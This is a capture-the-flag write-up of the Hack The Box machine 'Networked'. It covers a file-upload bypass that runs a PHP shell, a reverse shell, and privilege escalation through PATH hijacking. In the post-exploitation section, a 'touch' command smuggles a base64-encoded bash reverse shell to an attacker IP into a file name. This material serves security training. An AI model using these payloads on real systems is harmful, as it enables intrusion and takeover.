# Networked

This is my write-up for the machine **Networked** on Hack The Box located at: https://app.hackthebox.com/machines/203

## Enumeration

First I started with an [nmap scan](./res/Networked/10_10_10_146_nmapReport.txt), which shows the following

![nmapScan](./res/Networked/nmapScan.png)

Since only port 80 was open, apart from ssh, I navigated there to see what were we up against, and the default page looked like this

![defaultPage](./res/Networked/defaultPage.png)

Then I checked the source code to see if there was something interesting there, but it wasn't the case

![sourceCode](./res/Networked/sourceCode.png)

So I continued by running gobuster, which showed some interesting results

![gobuster](./res/Networked/gobuster.png)

And also with feroxbuster, which confirmed some of those results

![fer](./res/Networked/fer.png)

After that I ran nikto, which also found some interesting points worth exploring

![nikto](./res/Networked/nikto.png)

I also ran dirbuster to see if it found something else

![dirbuster](./res/Networked/dirbuster.png)

With all that information, the first thing that I wanted to explore was the backup.tar, so I went ahead and download it and extract it's content, where I found that there was only a copy of the php files

![backupTar](./res/Networked/backupTar.png)

Then I went to explore the uploads directory, which only contained a dot, on the other hand the upload.php allowed us to upload files, which was highly interesting

![uploads](./res/Networked/uploads.png)

But then when I tried to upload an image from a dog it gave me an error, even though the image was on the same format as the others, and as we could see on the code from the upload.php backup the format was valid

![uploadFail](./res/Networked/uploadFail.png)

After debugging the code a little bit more, I saw that the problem was that the image I was trying to upload was to heavy, so I changed it, and it worked

![imageUploaded](./res/Networked/imageUploaded.png)

## Exploitation

So I tried uploading a php shell hidden in the image data, but it wasn't getting executed

![phpShellFail](./res/Networked/phpShellFail.png)

Then I tried putting some characters that I found on google with the gif extension, and after loading the photos.php it got executed

![gif](./res/Networked/gif.png)

After that all I had to do was sending a reverse shell, and with that I got access to the target

![shell](./res/Networked/shell.png)

## Post Exploitation

Then I was going to the home directory to get the user flag when I saw that there was a crontab and a php file there, which could be interesting

![home](./res/Networked/home.png)

So I checked the crontab and it was calling the php file every 3 minutes

![homeCrontab](./res/Networked/homeCrontab.png)

Then I tried to grab the user flag, but apparently we didn't have enough permissions

![userFlagFail](./res/Networked/userFlagFail.png)

So I checked the php file, where I saw that there was being used the rm command without full path, so maybe it was possible to hijack that, and also that there was an echo which used the name of the file, so maybe we could inject something there

![checkAttackPhp](./res/Networked/checkAttackPhp.png)

First I checked the rm location and if I had permissions to write on it, which didn't seem to be the case

![rm](./res/Networked/rm.png)

So I tried by injecting a command through a file, with a lot of different options, but it gave me error at the creation, or it didn't get executed as for the case of the base64, until I tried escaping the dollar sign like this `touch "a;\$(echo 'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNi80NDQ0IDA+JjEn' | base64 -d | bash)"`

![commandInjection](./res/Networked/commandInjection.png)

Then I got a shell as the user guly, which wasn't root, but atleast had more privileges than apache one

![gulyShell](./res/Networked/gulyShell.png)

So, with that I grabbed the user flag

![userFlag](./res/Networked/userFlag.png)

And I also checked the dead letter, cause it caught my attention, but apparently it was the report of the check_attack.php

![deadLetter](./res/Networked/deadLetter.png)

After that I proceeded with the normal enumeration for the escalation, first checking the sudo -l, which showed an interesting script that can be executed as root without password

![sudoL](./res/Networked/sudoL.png)

So I checked the script, which was getting a user input to put the interface name and so on

![changeNameScript](./res/Networked/changeNameScript.png)

But when I tried to inject commands through the name, I got errors, cause the regex was filtering all special characters

![noSpecialCharacters](./res/Networked/noSpecialCharacters.png)

Then, after checking the code again, I realized that cat was used without the full path, so I created a malicious cat file, and put it into the path

![cat](./res/Networked/cat.png)

But when I tried to execute it, it didn't work, since the script ran normally, and it didn't drop me a shell

![injectionFail](./res/Networked/injectionFail.png)

After some tries, eventually I got some command injection by adding a space

![idInjection](./res/Networked/idInjection.png)

And with that I was able to get an elevated shell

![elevatedShell](./res/Networked/elevatedShell.png)

Then the only thing left to do was to retrieve the root flag

![rootFlag](./res/Networked/rootFlag.png)
